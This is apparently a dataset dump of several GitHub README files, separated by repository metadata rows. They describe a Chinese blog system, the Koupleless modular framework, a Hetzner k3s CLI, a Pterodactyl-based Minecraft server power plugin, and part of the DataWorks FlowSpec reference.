 本着不想造轮子的理念用过**halo**和**hexo**，见过 **[蘑菇博客](https://gitee.com/moxi159753/mogu_blog_v2)**和**[拾壹博客](https://gitee.com/quequnlong/shiyi-blog)**。别人的用着终究不是很顺手。最终觉得还是自己写个用也是不错的，就当做练手，也是为了折腾。在2023年初开始本项目的开发，开始打算简单写写能用就行，不过最后感觉既然都写了，那就多写点东西吧。目的打造一个**笔记+博客+本地网盘**的项目，现在还没完全构思好，边写边构思。(本项目还未完成，持续更新中，如果有想法的小伙伴也可以分享自己的看法)

## 项目介绍

DotCode(点码），是一个前后分离的博客系统。

前端使用 **Vue** + **ElementUi** 和**Vue 3 + TypeScript + Vite + ElementPlus**

后端使用 **SpringBoot** + **Mybatis-plus**进行开发，使用**Sa-Token**作为登录验证和权限校验。

## 项目特点

- 后台采用父子包的方式以及友好的代码结构及注释，便于阅读及二次开发

- 实现前后端分离，通过 **Json** 进行数据交互，前端再也不用关注后端技术

- 页面交互，后台管理使用 **Vue2.x**，门户展示采用**Vue3**。

- 引入 **RBAC** 权限管理设计，灵活的权限控制，按钮级别的权限控制，满足绝大部分的权限需求

- 采用**Markdown** 编辑器([vditor](https://b3log.org/vditor/)），更符合开发者的编辑方式

- 一键建站，快速迁移，数据备份，Markdown导入，Markdown导出

##  项目目录

- doc：资源文件；
- xiaohai_admin: 系统入口； 
- xiaohai_common：提供公共类；
- xiaohai_file：提供文件上传相关服务；
- xiaohai_generator：提供mybatis-plus代码生成相关服务；
- xiaohai_note：提供博客相关服务；
- xiaohai_system：提供系统(用户、角色、菜单、字典等)相关服务；
- xiaohai_web： VUE2的后台管理页面；
- xiaohai_web-show：VUE3的门户网站；

## 未来计划

- [x] 基础框架搭建
- [x] 增加用户管理
- [x] 增加角色管理
- [x] 增加菜单管理、按钮级别的权限控制
- [x] 增加数据字典管理
- [x] 增加在线用户管理
- [x] 增加标签、分类管理
- [x] 增加文章、写作管理
- [x] 增加必应图片接口
- [x] web-show页面使用web页面登录
- [x] 适配web-show页面的移动端布局
- [x] 增加评论模块、评论表情
- [x] 增加友链管理
- [x] 增加点赞模块
- [x] 增加web-show页面日志管理
- [x] 增加流量访问监控
- [x] 增加Markdown文章导入
- [x] 增加留言模块
- [x] 通过Jpom实现自动化部署
- [x] 增加网站配置
- [x] 增加问题反馈管理
- [x] 文件管理
- [X] 本地笔记同步
- [X] 邮箱提醒功能
- [X] 消息通知
- [ ] IP限流
- [ ] 第三方登录
- [X] 第三方平台获取、CSDN、掘金、简书、博客园、知乎
- [ ] 第三方平台同步
- [ ] 大模型辅助写博客
- [X] 数据备份，Markdown导入，Markdown导出
- [ ] ...

## nginx配置

```    
server {
    listen       80;
    server_name  localhost;
    
        location / {
            alias D:/bolg/xiaohai-web-show/;   #修改为xiaohai-web-show的打包路径
            try_files $uri $uri/ /index.html;
            index  index.html index.htm;
        }
    
        location /manage/ {
            alias  D:/bolg/xiaohai-web/; #修改为xiaohai-web的打包路径
            try_files $uri $uri/ /manage/index.html;
            index  index.html index.htm;
        }
    
        location /prod-api/ {
    	    proxy_set_header Host $http_host;
    	    proxy_set_header X-Real-IP $remote_addr;
    	    proxy_set_header REMOTE-HOST $remote_addr;
    	    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    	    proxy_pass http://127.0.0.1:8089/prod-api/; #修改为后台请求地址
    	}
    
        error_page   500 502 503 504  /50x.html;
        location = /50x.html {
            root   html;
        }
    }
    
```
## 打赏
如果觉得项目不错的话可以打赏哦。您的支持就是我最大的动力！

<img src=""./doc/docs/image/beg.gif"" width=""200""/><img src=""./doc/docs/image/wxpay.jpg"" width=""200"" />

## 捐赠信息

| 捐赠者     | 捐赠金额 | 捐赠日期   |
| ---------- | -------- | ---------- |
| Powerless🌨 | 1元      | 2024-03-19 |



## 特别鸣谢

- 感谢 [JetBrains](https://jb.gg/OpenSourceSupport) 提供的免费开源 License：

[<img src=""./doc/docs/image/jb_beam.png"" width=""100"" />](https://www.jetbrains.com/?from=xiaohai_blog)

## 网站截图

### web

|                     web                      |                     web                     |
|:--------------------------------------------:|:-------------------------------------------:|
| ![image text](doc/docs/image/web/register.png)  |  ![image text](doc/docs/image/web/login.png)   |
| ![image text](doc/docs/image/web/dashboard.png) | ![image text](doc/docs/image/web/article.png)  |
|   ![image text](doc/docs/image/web/edit.png)    |   ![image text](doc/docs/image/web/tags.png)   |
| ![image text](doc/docs/image/web/category.png)  | ![image text](doc/docs/image/web/comment.png)  |
|   ![image text](doc/docs/image/web/user.png)    |   ![image text](doc/docs/image/web/role.png)   |
|   ![image text](doc/docs/image/web/menu.png)    | ![image text](doc/docs/image/web/dictType.png) |
| ![image text](doc/docs/image/web/dictData.png)  |   ![image text](doc/docs/image/web/log.png)    |
| ![image text](doc/docs/image/web/log-view.png)  |  ![image text](doc/docs/image/web/online.png)  |

### web-show

| web-show                                               | web-show                                               |
|--------------------------------------------------------|--------------------------------------------------------|
| ![image text](doc/docs/image/web-show/index.png)          | ![image text](doc/docs/image/web-show/index-dark.png)     |
| ![image text](doc/docs/image/web-show/article.png)        | ![image text](doc/docs/image/web-show/back.png)           |
| ![image text](doc/docs/image/web-show/category.png)       | ![image text](doc/docs/image/web-show/search.png)         |
| mobile                                                 |  mobile                                                       |
| ![image text](doc/docs/image/web-show/mobile-index.png)   | ![image text](doc/docs/image/web-show/mobile-side.png)    |
| ![image text](doc/docs/image/web-show/mobile-article.png) | ![image text](doc/docs/image/web-show/mobile-comment.png) |

",0,0,2,apache-2.0,0.0
koupleless/koupleless,main,"[![Coverage Status](https://codecov.io/gh/koupleless/koupleless/branch/main/graph/badge.svg)](https://codecov.io/gh/koupleless/koupleless/branch/main/graph/badge.svg)
![license](https://img.shields.io/badge/license-Apache--2.0-green.svg)
![Maven Central](https://img.shields.io/maven-central/v/com.alipay.sofa.koupleless/koupleless-runtime)

<h1 align=""center"">Koupleless: Modular Development Framework and Serving Platform</h1>

<div align=""center"">

English | [简体中文](./README-zh_CN.md)

</div>

Would you like your application to start in just 10 seconds, consuming only 20MB of memory? Have you encountered issues with large applications causing collaboration bottlenecks and low release efficiency? Are you struggling with the high resource and maintenance costs associated with numerous small applications? If you're facing these challenges, then Koupleless might be the solution you're looking for. Koupleless approaches application architecture from a modular perspective, offering an extremely low-cost solution to address pain points encountered throughout the entire lifecycle of application development, operation, and execution:

1. Excessive application fragmentation leading to high machine and long-term maintenance costs
2. Insufficient application fragmentation causing collaboration bottlenecks
3. Lengthy application build, startup, and deployment times resulting in low iteration efficiency
4. Severe fragmentation of SDK versions with high upgrade costs and long cycles
5. High costs associated with building platforms and middle platforms, as well as difficulties in business asset precipitation and architectural constraints
6. Long microservice chains leading to poor call performance
7. High costs associated with microservice decomposition and evolution

How does Koupleless address these issues? Koupleless vertically and horizontally splits traditional applications, with the vertical split separating the base and the horizontal split separating multiple modules. The base shields modules from infrastructure concerns, while modules contain only the business-specific portion, enabling quick startup and insulating them from infrastructure concerns, allowing module developers to experience a Serverless-like environment. Koupleless thus evolves into a low-cost, Serverless solution by refining the granularity of development and operations while shielding infrastructure. For detailed explanations of the principles, please refer to the official website.
Further detailed explanations of the principles are available on [the official website](https://koupleless.io/docs/introduction/architecture/arch-principle/).

![image](https://github.com/koupleless/koupleless/assets/3754074/004c0fa5-62f6-42d7-a77e-f7152ac89248)

The most important aspect is that Koupleless can **assist existing applications** in evolving into a modular development model **at an extremely low cost**, addressing the aforementioned issues and helping businesses reduce costs, increase efficiency, and enhance competitiveness.

## The Advantages of Koupleless

Koupleless is a mature development framework and operational scheduling platform capability that has been refined internally within Ant Group for 5 years. Compared to traditional image-based application models, it offers approximately 10 times improvement in development, operations, and runtime calling. Summarized into 5 key features: Fast, Cost-efficient, Flexible deployment, Smooth evolution, and Production-scale validation.

<img width=""788"" alt=""image"" src=""https://github.com/sofastack/sofa-serverless/assets/3754074/11d1d662-d33b-482b-946b-bf600aeb34da"">

Here are performance data comparing modular development and deployment with traditional image-based approaches for an actual production application.

<img width=""600"" alt=""image"" src=""https://github.com/koupleless/koupleless/assets/3754074/913a6f11-54cb-4c8b-b417-d014e53c920a""/>

## What is a Module?

Modules utilize extreme sharing and isolation technologies, which enable hot deployment (updating online code without restarting the machine).

Isolation is achieved through ClassLoader class isolation based on [SOFAArk](https://github.com/sofastack/sofa-ark) and object isolation based on [SpringBoot SpringContext](https://github.com/spring-projects/spring-boot).

Sharing is facilitated by class delegation loading based on [SOFAArk](https://github.com/sofastack/sofa-ark) and cross-SpringContext object lookup and invocation based on SpringBootManager.

So, in physical terms, a module can be considered as one ClassLoader + one SpringContext.

## What is the Base？
The base is just a regular application, same with the original app (such as standard SpringBoot).

## Quick start
Please check [the official website Quick Start](https://koupleless.io/docs/quick-start/).

https://github.com/koupleless/koupleless/assets/3754074/e44c9406-4bd4-4fcf-babc-4ae9e615984e

## Koupleless Components

![image](https://github.com/sofastack/sofa-serverless/assets/101314559/995f1e17-f3be-4672-b1b8-c0c041590fb0)

## Contributing
We appreciate anyone who contribute here together. Please scan the QR code to join the developer collaboration group.

| IAM                        | number      | QR code                                                                                                                          |
|----------------------------|-------------|----------------------------------------------------------------------------------------------------------------------------------|
| DingTalk group (recommand) | 24970018417 | <img width=""256"" alt=""image"" src=""https://github.com/koupleless/koupleless/assets/3754074/7ba1db74-20c1-43a4-a2ab-d38c99a920cd""> |
| WeChat                     | zzl_ing     | <img width=""256"" alt=""image"" src=""https://github.com/koupleless/koupleless/assets/3754074/35ebc2bc-86cd-4a24-b12e-e9f44cccc2d7""> |

you can also join us by [discord](https://discord.gg/bqx9RDbSfF)

## Long-term planning and our vision
We hope to further refine and open up these capabilities to be more extreme and applicable to a wider range of scenarios. Help more businesses solve application development problems, achieve cost reduction and efficiency improvement, and ultimately become an excellent research and development framework and solution for global green computing, achieving:

1. Speed as you need
2. Pay as you need
3. Deploy as you need
4. Evolution as you need

<img width=""1069"" alt=""image"" src=""https://github.com/koupleless/koupleless/assets/3754074/17ebd41d-38c7-46e8-a4ba-b6b8bf8f76dd"">
",17,61,16,apache-2.0,90.0
easystartup-io/k3s-simplified,main,"<!-- PROJECT LOGO -->
<br />
<p align=""center"">
  <a href=""https://github.com/easystartup-io/k3s-simplified"">
    <img src=""https://github.com/easystartup-io/k3s-simplified/raw/main/docs/static/img/logo.png"" alt=""Logo"" width=""112"" height=""112"">

  </a>

<h2 align=""center"">k3s-simplified</h2>

  <p align=""center"">
    Best simplified way to create a fully functional kubernetes cluster in production on <a href=""https://hetzner.com"" target=""_blank"">Hetzner Cloud</a> using CLI (command line interface) 
  </p>
  <hr />
</p>

# Full Documentation

Access comprehensive instructions at: **[https://k3s-simplified.easystartup.io/docs/](https://k3s-simplified.easystartup.io)**

---

Its a fully open source(MIT LICENSE) drop in replacement to hetzner-k3s written in java, which runs as a single binary, no extra dependency needed


## Project Background

1. This project originated as a fork of [hetzner-k3s](https://github.com/vitobotta/hetzner-k3s).
2. Rewritten in Java for cross-platform compatibility and my familiarity with the language.
3. Actively maintained for production use.
4. I offer full support, including paid consultancy (contact details available [here](https://k3s-simplified.easystartup.io/docs/contact-me)).
5. Emphasis on developing a private, isolated cluster setup, crucial for production environments to safeguard against unauthorized external access.

## About the Tool

A command-line interface (CLI) for effortlessly creating and managing Kubernetes clusters in [Hetzner Cloud](https://www.hetzner.com/cloud). It utilizes [k3s](https://k3s.io/) by [Rancher](https://rancher.com/) for a lightweight Kubernetes experience.

## License

Distributed freely under the [MIT License](https://github.com/easystartup-io/k3s-simplified/blob/main/LICENSE.txt)

## Acknowledgments and shout out to

1. [hetzner-k3s](https://github.com/vitobotta/hetzner-k3s): was the starting point for this project. The inspiration for this project and the basis for expanding my own cluster.
2. [hetznercloud-java](https://github.com/tomsiewert/hetznercloud-java): Essential for cloud API integration. Contributing back to this community project was enriching, especially with the rapid acceptance of my PRs addressing Hetzner API changes.
",16,0,1,mit,1.0
Kamesuta/BungeePteroPower,main,"# BungeePteroPower
![LogoArt](https://github.com/Kamesuta/BungeePteroPower/assets/16362824/e8914f79-806b-436c-a0e6-e4eaf8ad5eca)  
[![License: MIT](https://img.shields.io/github/license/Kamesuta/BungeePteroPower?label=License)](LICENSE)
[![Spigotmc Version](https://img.shields.io/spiget/version/114883?logo=spigotmc&label=Spigotmc%20Version)](https://www.spigotmc.org/resources/%E2%9A%A1-bungeepteropower-%E2%9A%A1-start-stop-servers-when-player-join-leave.114883/)
[![JitPack](https://img.shields.io/jitpack/version/com.github.Kamesuta/BungeePteroPower?logo=jitpack&label=JitPack)](https://jitpack.io/#Kamesuta/BungeePteroPower)  
[![Spigotmc Downloads](https://img.shields.io/spiget/downloads/114883?logo=spigotmc&label=Spigotmc%20Downloads)](https://www.spigotmc.org/resources/%E2%9A%A1-bungeepteropower-%E2%9A%A1-start-stop-servers-when-player-join-leave.114883/)
[![bStats Servers](https://img.shields.io/bstats/servers/20917?label=bStats%20Servers)](https://bstats.org/plugin/bungeecord/BungeePteroPower/20917)  

BungeePteroPower is a plugin that can automatically start/stop servers based on the number of players.  
It can start and stop servers on the [Pterodactyl panel](https://pterodactyl.io/) when players join or leave the Bungeecord proxy server.  
This helps to save server resources and manage servers more efficiently.  

https://github.com/Kamesuta/BungeePteroPower/assets/16362824/019fdfc5-f0fc-4532-89f3-3342b5812593

## Key Features

- Automatically stops servers using Pterodactyl's API when there are no players on the server for a certain period of time.
    - The time until shutdown can be configured for each server.
- Automatically starts servers using Pterodactyl's API when players join the server.
- Permissions settings allow for specifying players who can manually start servers and players for whom automatic startup is enabled upon joining.
- You can reset the server from a backup when it shuts down.
    - This is useful when creating mini-game servers that reset once played.

![Overview](https://github.com/Kamesuta/BungeePteroPower/assets/16362824/3cece79e-b41a-4119-a6cd-4800dd4f705d)

## Download

- You can download it from [Spigot](https://www.spigotmc.org/resources/%E2%9A%A1-bungeepteropower-%E2%9A%A1-start-stop-servers-when-player-join-leave.114883/) or [GitHub Releases](https://github.com/Kamesuta/BungeePteroPower/releases).

## Requirements

- Java 11 or higher
    - uses `java.net.http.HttpClient` in Java 11 for REST API communication with Pterodactyl.

## Getting Started

1. Obtain an API key in the Pterodactyl panel.
    - The client API key for Pterodactyl can be found in the ""API Credentials"" tab on the account page.
2. Add the plugin to the BungeeCord server and start it.
3. Configure the [Required Settings](#required-settings) in the generated `plugins/BungeePteroPower/config.yml` file.
    ```yml
    # Pterodactyl configuration
    pterodactyl:
      # The URL of your pterodactyl panel
      # If you use Cloudflare Tunnel, you need to allow the ip in the bypass setting.
      url: ""https://panel.example.com""
      # The client api key of your pterodactyl panel. It starts with ""ptlc_"".
      # You can find the client api key in the ""API Credentials"" tab of the ""Account"" page.
      apiKey: ""ptlc_000000000000000000000000000000000000000000""
    
    # Per server configuration
    servers:
      pvp:
        # Pterodactyl server ID
        # You can find the Pterodactyl server ID in the URL of the server page.
        # For example, if the URL is https://panel.example.com/server/1234abcd, the server ID is 1234abcd.
        id: 1234abcd
        # The time in seconds to stop the server after the last player leaves.
        # If you don't want to stop the server automatically, set it to -1.
        # If you set it to 0, the server will be stopped immediately after the last player leaves.
        timeout: 30
    ```
4. Reload the config with the `/ptero reload` command.
5. Configure the [Permission Settings](#permission-settings).  
    (You **MUST** configure permission to use this plugin, otherwise the player will not be able to do anything!)  
    You can use either of the following methods.  
    - Use a permission plugin like [LuckPerms](https://luckperms.net/).
        1. For LuckPerms, use the following commands to set permissions:
            ```
            # The player can start all servers
            /lp user <player_name> permission set ptero.autostart.*
            # The player can start specific server
            /lp user <player_name> permission set ptero.autostart.<server_name>
            # All players can start all servers
            /lp group default permission set ptero.autostart.*
            ```
            ※ `<player_name>` refers to the player's name, `<server_name>` refers to the server name specified in BungeeCord's `config.yml`.
    - Use built-in permission settings.
        1. Open `config.yml`.
        2. Add the following settings to the `config.yml` file.
            ```yml
            permissions:
                default:
                # All players can start all server
                - ptero.autostart.*
                # All players can start specific server
                - ptero.autostart.<server_name>
            ```  
            ※ `<server_name>` refers to the server name specified in BungeeCord's `config.yml`.
        3. Restart the BungeeCord server.
  
## Usage

### Automatic Startup

- Servers will automatically start when players attempt to join each server on BungeeCord.
    - This feature is available only to players with the `ptero.autostart.<server_name>` permission.

### Manual Start/Stop

- Use the `/ptero start <server_name>` command to manually start a server.
    - This command is available only to players with the `ptero.start.<server_name>` permission.
- Use the `/ptero stop <server_name>` command to manually stop a server.
    - This command is available only to players with the `ptero.stop.<server_name>` permission.

※ `<server_name>` refers to the server name specified in BungeeCord's `config.yml`.

### Reloading config.yml/Language files

- Use `/ptero reload` to reload the config.yml and language files.

## Configuration

The `config.yml` file includes the following settings, but not all items need to be configured.

### Required Settings

- `pterodactyl`: Configure settings for Pterodactyl, including URL and API key.
    - `url`: Set the URL of your Pterodactyl panel. (Example: https://panel.example.com/)
        - If you are using services like Cloudflare Tunnel, ensure proper bypass settings for IP-based communication.
    - `apiKey`: Set the client API key for Pterodactyl.
        - It begins with `ptlc_`.
        - Client API keys for Pterodactyl can be found in the ""API Credentials"" tab on the account page.
- `servers`: Configure settings for each server. Set the server ID and the time until automatic shutdown.
    - `id`: Set the server ID on Pterodactyl.
        - Server IDs on Pterodactyl can be found in the URL of the server page.
        - For example, if the URL is https://panel.example.com/server/1234abcd, the server ID is 1234abcd.

### Optional Settings

- `version`: Set the version of the plugin.
    - When updating the plugin, a warning will be displayed if this value does not match the plugin version.
    - A `config.new.yml` file will be generated, and manual migration of settings using a merge tool is required.
    - After migration, please change this value to the new version.
- `checkUpdate`: Set whether to check for plugin updates. The default is `true`.
- `language`: Set the language to be used. The default is English (`en`).
    - Refer to the comments in the [config file](./src/main/resources/config.yml) for supported languages.
- `startTimeout`: After starting a server with this plugin, it will stop the server if there are no players for a certain period. The unit is seconds.
    - After starting, the server will stop after the `startTimeout` plus the server's timeout duration.
    - Setting it to 1 keeps the server running until players join and leave.
- `powerControllerType`: Set the type of power controller to be used.
    - The built-in PowerController currently supports only `pterodactyl`, which operates Pterodactyl.
    - By adding add-ons, you can add your own custom PowerController.
      Certainly! Here's the English translation of the provided description:
- `useSynchronousPing`: This setting determines whether to perform **synchronous** pinging to the server during login. (Experimental feature)
    - When enabled, pinging the server during login will happen synchronously rather than asynchronously.
    - This allows displaying BungeePteroPower messages (`join_autostart_login` in messages.yml) instead of the ""Could not connect to a default or fallback server"" message upon login.
    - The default value is `false`. Enabling this can be useful if you want to set servers (such as lobby servers) to a suspended state in BungeePteroPower immediately after login.
- `startupJoin`: After server startup, it is used to automatically join players to the server and check the server's status.
    - `timeout`: Set the maximum waiting time for players to join after server startup.
        - Set this value to the maximum time it takes for the server to start.
        - Setting it to 0 disables this feature, and players will not automatically join after startup.
    - `joinDelay`: Once the server is pingable, wait the specified amount of seconds before sending the player to the server
        - This is useful to wait for plugins like Luckperms to fully load
        - If you set it to 0, the player will be connected as soon as the server is pingable
    - `pingInterval`: Set the interval for checking the server's status.
- `restoreOnStop`: Configure settings for the feature to reset the server from a backup when it is stopped.
    - `timeout`: Set the maximum waiting time after sending the stop signal for the server to stop. (The restore will be performed after the server stops)
    - `pingInterval`: Set the interval for checking if the server is offline after sending the stop signal.
- `servers`: Configure settings for each server. Set the server ID and the time until automatic shutdown.
    - `timeout`: When there are no players on the server, it will stop after a certain period. The unit is seconds.
    - `backupId`: The UUID of the backup to restore when the server stops.
        - If this setting is empty or removed, no restore from backup will be performed when the server stops.
        - Useful for servers that need to be reset after each game.

### Permission Settings

BungeePteroPower plugin allows fine-grained control over commands available to players for each server using permissions.

- `ptero.autostart.<server_name>`: Servers will automatically start when players join each server on BungeeCord for players with this permission.
- `ptero.start.<server_name>`: Allows the `/ptero start <server_name>` command to manually start a server.
    - If a player doesn't have `ptero.autostart.<server_name>` permission but has this permission, they will see a manual start button when they join the server.
- `ptero.stop.<server_name>`: Allows the `/ptero stop <server_name>` command to manually stop a server.
- `ptero.reload`: Allows the `/ptero reload` command to reload the config.

※ `<server_name>` refers to the server name specified in BungeeCord's `config.yml`.
※ Specify `*` for `<server_name>` to apply permissions to all servers.

### About Language Files

- You can set the language in config.yml using the language option.
    - Please refer to the comments in the config file for the supported languages.
- Upon startup, a file for the language set in config.yml will be generated.
    - This file allows you to define only the messages you want to change.
    - Messages that are not defined will be loaded from the language file set within the plugin.
- You can edit and then reload the plugin's language by using the `/ptero reload` command.
- Contributions via Pull Requests for additional language files are welcome.

## Information for Plugin Developers

### About Power Controllers

BungeePteroPower provides a Power Controller API for supporting platforms other than Pterodactyl.  
By creating add-ons, you can add power controllers for platforms other than Pterodactyl!

We also welcome pull requests for adding built-in power controllers!  
Ideally, we would like to support the following:
- Power controllers that can start servers locally
- Power controllers compatible with management software other than Pterodactyl.  
    For example, we would like to support the following:
    - PufferPanel
    - Minecraft Server Manager
    - MCSManager
    - MC Server Soft
    - AMP

### Creating Add-ons

- BungeePteroPower provides an API for integration with other plugins.
    - If you want to support platforms other than Pterodactyl, it is possible by implementing the API.
- You can use the BungeePteroPower API by adding dependencies.
    1. Add the JitPack repository inside the pom.xml of your add-on:
        ```xml
        <repositories>
            <repository>
                <id>jitpack.io</id>
                <url>https://jitpack.io</url>
            </repository>
        </repositories>
        ```
    2. Add BungeePteroPower as a dependency:
        ```xml
        <dependency>
            <groupId>com.github.Kamesuta</groupId>
            <artifactId>BungeePteroPower</artifactId>
            <version>version</version>
        </dependency>
        ```
    3. Add the dependency to your plugin.yml:
        ```yml
        depends:
          - BungeePteroPower
        ```
    4. Use the API:
        ```java
        import com.kamesuta.bungeepteropower.api.BungeePteroPowerAPI;

        public class YourPlugin extends JavaPlugin {
            @Override
            public void onEnable() {
                // Get an instance of BungeePteroPowerAPI
                BungeePteroPowerAPI api = BungeePteroPowerAPI.getInstance();
                // Register your custom PowerController
                api.registerPowerController(""your_service"", new YourPowerController());
            }
        }
        ```
        For an example implementation of a PowerController for Pterodactyl, please refer to [PterodactylController.java](./src/main/java/com/kamesuta/bungeepteropower/power/PterodactylController.java).
- If you want your PowerController to be added to BungeePteroPower, please send a pull request.

### Building

Pull requests are welcome for BungeePteroPower.  
You can build it using the following steps:

```bash
git clone https://github.com/Kamesuta/BungeePteroPower.git
cd BungeePteroPower
mvn install
```
- This plugin needs to be built with Java 11 or higher.
- After building, a `BungeePteroPower-<version>.jar` file will be generated in the `target` directory.

## About Statistics Data

BungeePteroPower collects anonymous statistical data using [bStats](https://bstats.org/).  
You can find the statistics data [here](https://bstats.org/plugin/bungeecord/BungeePteroPower/20917).

bStats is used to understand the usage of the plugin and help improve it.  
To disable the collection of statistical data, please set `enabled` to `false` in `plugins/bStats/config.yml`
",9,2,3,mit,8.0
aliyun/dataworks-spec,master,"[![License](https://img.shields.io/badge/license-Apache%202-4EB1BA.svg)](https://www.apache.org/licenses/LICENSE-2.0.html)
![version](https://img.shields.io/badge/version-1.2.0-blue)
[![Java CI with Maven](https://github.com/aliyun/dataworks-spec/actions/workflows/main.yml/badge.svg)](https://github.com/aliyun/dataworks-spec/actions/workflows/main.yml)
[![CN doc](https://img.shields.io/badge/文档-中文版-blue.svg)](./README_zh_CN.md)

# Introduction

* In this project we defined a generic workflow description specification(FlowSpec)
* We developed a FlowSpec based migration tool(MigrationX) to migrate workflow models from different workflow scheduling systems to DataWorks workflow
  model.
* We can use this tool to develop conversion tools for other scheduling system workflow model.

# FlowSpec Field Reference

## CycleWorkflow

CycleWorkflow is the specification of a scheduled workflow that contains task nodes and dependencies

### Fields

| Field Name |                Field Type                 | Required | Description                            |
|:----------:|:-----------------------------------------:|----------|----------------------------------------|
| `version`  |                 `string`                  | Yes      | Version                                |
|   `kind`   |                 `string`                  | Yes      | CycleWorkflow                          |
| `metadata` |          [`Metadata`](#metadata)          | No       | define extra meta data of workflow     |
|   `spec`   | [`CycleWorkflowSpec`](#cycleworkflowspec) | Yes      | specific definition of `CycleWorkflow` |

## ManualWorkflow

ManualWorkflow is the specification of manual triggered workflow consist of task nodes and dependencies

### Fields

| Field Name |                 Field Type                  | Required | Description                             |
|:----------:|:-------------------------------------------:|----------|-----------------------------------------|
| `version`  |                  `string`                   | Yes      | version info                            |
|   `kind`   |                  `string`                   | Yes      | ManualWorkflow                          |
| `metadata` |           [`Metadata`](#metadata)           | No       | define extra meta data of workflow      |
|   `spec`   | [`ManualWorkflowSpec`](#manualworkflowspec) | Yes      | specific definition of `ManualWorkflow` |

## CycleWorkflowSpec

CycleWorkflowSpec the specification of `CycleWorkflow`

### Fields

|     Field Name     |                    Field Type                    | Required | Description                                      |
|:------------------:|:------------------------------------------------:|----------|--------------------------------------------------|
|      `nodes`       |            `Array<`[`Node`](#node)`>`            | Yes      | list of cycle node definition                    |
|    `variables`     |        `Array<`[`Variable`](#variable)`>`        | No       | list of variable definition                      |
|     `scripts`      |          `Array<`[`Script`](#script)`>`          | No       | list of script definition                        |
|     `triggers`     |         `Array<`[`Trigger`](#trigger)`>`         | No       | list of cycle trigger definition                 |
|    `artifacts`     |        `Array<`[`Artifact`](#Artifact)`>`        | No       | list of artifact definition                      |
| `runtimeResources` | `Array<`[`RuntimeResource`](#runtimeresource)`>` | No       | list of runtime resource definition              |
|  `fileResources`   |    `Array<`[`FileResource`](#fileResource)`>`    | No       | list of file resource definition                 |
|    `functions`     |        `Array<`[`Function`](#function)`>`        | No       | list of function definition                      |
|       `flow`       |            `Array<`[`Flow`](#flow)`>`            | No       | list of flow defines node dependent relationship |

## ManualWorkflowSpec

ManualWorkflowSpec is the specification of `ManualWorkflow`

### Fields

|     Field Name     |                    Field Type                    | Required | Description                                      |
|:------------------:|:------------------------------------------------:|----------|--------------------------------------------------|
|      `nodes`       |            `Array<`[`Node`](#node)`>`            | Yes      | list of manual node definition                   |
|    `variables`     |        `Array<`[`Variable`](#variable)`>`        | No       | list of variable definition                      |
|     `scripts`      |          `Array<`[`Script`](#script)`>`          | No       | list of script definition                        |
|    `artifacts`     |        `Array<`[`Artifact`](#Artifact)`>`        | No       | list of artifact definition                      |
| `runtimeResources` | `Array<`[`RuntimeResource`](#runtimeresource)`>` | No       | list of runtime resource definition              |
|  `fileResources`   |    `Array<`[`FileResource`](#fileResource)`>`    | No       | list of file resource definition                 |
|    `functions`     |        `Array<`[`Function`](#function)`>`        | No       | list of function definition                      |
|       `flow`       |            `Array<`[`Flow`](#flow)`>`            | No       | list of flow defines node dependent relationship |

## Metadata

Defines extra metadata of resource

### Fields

|  Field Name   | Field Type | Required | Description         |
|:-------------:|:----------:|----------|---------------------|
|    `owner`    |  `string`  | No       | owner of spec       |
| `description` |  `string`  | No       | description of spec |

## Node

Node is the definition of workflow node.

### Fields

|    Field Name     |                 Field Type                 | Required | Description                                                                                         |
|:-----------------:|:------------------------------------------:|----------|-----------------------------------------------------------------------------------------------------|
|       `id`        |                   String                   | Yes      | node local identifier in spec                                                                       |                     
|      `name`       |                   String                   | Yes      | node name                                                                                           |                     
|     `script`      |            [`Script`](#script)             | Yes      | referred script define or reference of the node                                                     |                     
|    `functions`    |     `Array<`[`Function`](#function)`>`     | No       | referred functions define or reference of the node                                                  |
|  `fileResources`  | `Array<`[`FileResource`](#fileResource)`>` | No       | referred file resources define or reference of the node                                             |                         
|     `inputs`      |            [`Inputs`](#inputs)             | No       | inputs of the node. `TableArtifact`, `NodeArtifcat`, `Variable` can be used as inputs of `Node`     |
|     `outputs`     |           [`Outputs`](#outputs)            | No       | outputs of the node. `TableArtifact`, `NodeArtifcat`, `Variable` can be used as outputs of `Node`   |
| `runtimeResource` |   [`RuntimeResource`](#runtimeResource)    | No       | runtime resource define or reference of the node                                                    |
|   `recurrence`    |                   string                   | No       | `recurrence` defines cycle schedule state of node, see enumerated values: [Recurrence](#recurrence) |
|    `priority`     |                  integer                   | No       | priority of the node, the larger the value, the higher the priority                                 |
|     `timeout`     |                  integer                   | No       | timeout in seconds of the node, node instance will be killed when timed out after specified seconds |
|  `instanceMode`   |                   string                   | No       | instance mode of the node, see enumerated values [InstanceMode](#instancemode)                      |
|    `rerunMode`    |                   string                   | No       | the rerun strategy of the node instance, see enumerated values [RerunMode](#rerunmode)              |

## Flow

The `flow` section of spec defines dependencies of related workflow nodes.

### Fields

| Field Name |               Field Type               | Required | Description                                      |
|:----------:|:--------------------------------------:|----------|--------------------------------------------------|
|  `nodeId`  |                `string`                | Yes      | node identifier of specific node defined in spec |
| `depends`  | `Array<`[`FlowDepend`](#flowDepend)`>` | Yes      | list of nodes depended by the node               |

## FlowDepend

`FlowDepend` define the dependency or relationship between workflow nodes.

| Field Name | Field Type | Required | Description                                                                          |
|:----------:|:----------:|----------|--------------------------------------------------------------------------------------|
|  `nodeId`  |  `string`  | Yes      | node identifier of specific node defined in spec                                     |
|   `type`   |  `string`  | Yes      | dependency type of the node, see enumerated values [DependencyType](#dependencyType) |

## Variable

`Variable` defines variables of workflow. Variables can be used in workflow nodes.

### Fields

| Field Name | Field Type | Required | Description                                                           |
|:----------:|:----------:|----------|-----------------------------------------------------------------------|
|    `id`    |  `string`  | Yes      | local identifier in spec                                              |
|   `name`   |  `string`  | Yes      | variable name                                                         |
|  `scope`   |  `string`  | Yes      | variable scope, see enumerated values [VariableScope](#variableScope) |
|   `type`   |  `string`  | Yes      | variable type, see enumerated values [VariableType](#variableType)    |
|  `value`   |  `string`  | Yes      | variable value expression                                             |

## Script

`Script` defines script source file resources. Scripts can be used in workflow by nodes, functions or resources.

### Fields

|  Field Name  |             Field Type             | Required | Description                                  |
|:------------:|:----------------------------------:|----------|----------------------------------------------|
|     `id`     |              `string`              | Yes      | local identifier in spec                     |
|    `path`    |              `string`              | Yes      | script path                                  |
|  `language`  |              `string`              | No       | script language                              |
|  `runtime`   |        [Runtime](#runtime)         | Yes      | runtime definition of script                 |
